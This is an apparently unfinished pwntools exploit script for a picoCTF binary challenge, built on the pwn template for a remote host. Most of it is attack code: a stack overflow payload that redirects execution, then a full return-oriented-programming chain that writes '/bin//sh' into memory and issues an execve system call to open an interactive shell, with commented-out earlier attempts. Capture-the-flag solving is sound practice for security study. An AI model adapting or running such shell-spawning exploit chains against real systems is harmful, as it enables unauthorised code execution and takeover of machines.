#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 62316 ./vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./test')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 60352)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *vuln+62
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
win = 0x08049da0
ret = 0x401304
main = 0x8049f00
vuln =0x08049ec0
under = 0x08049e20
# win = 0x0000000000401210
# p = 'a'*2
p =''
# p += 'a'*4*3
# p += 'a'*4*3
p += 'b'*14
# p += '\x00'
p += p32(under)
p += p32(main)
print(p)
# p += p64(main)
# p += p64(win)
# p += p64(win)
# p += 'a'*40
# pause()
io.sendlineafter("flag\n",p)
# p = 'b'*14
# p += p32(win+7)

from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # f11ef12d407798a76a216488079aa8f02ce7f4b90b68af3ef3750ba43893e15d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = 'b'*14

rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009f060)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009f064)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret; 
rop += p(0x00000000)
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009f068)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00001022) # 0x08049022: pop ebx; ret; 
rop += rebase_0(0x0009f060)
rop += rebase_0(0x0001c371) # 0x08064371: pop ecx; add al, 0xf6; ret; 
rop += rebase_0(0x0009f068)
rop += rebase_0(0x00029095) # 0x08071095: pop edx; xor eax, eax; pop edi; ret; 
rop += rebase_0(0x0009f068)
rop += p(0xdeadbeef)
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00031f00) # 0x08079f00: int 0x80; ret;
io.sendline(rop)
# io.sendlineafter("flag\n",p)

io.interactive()

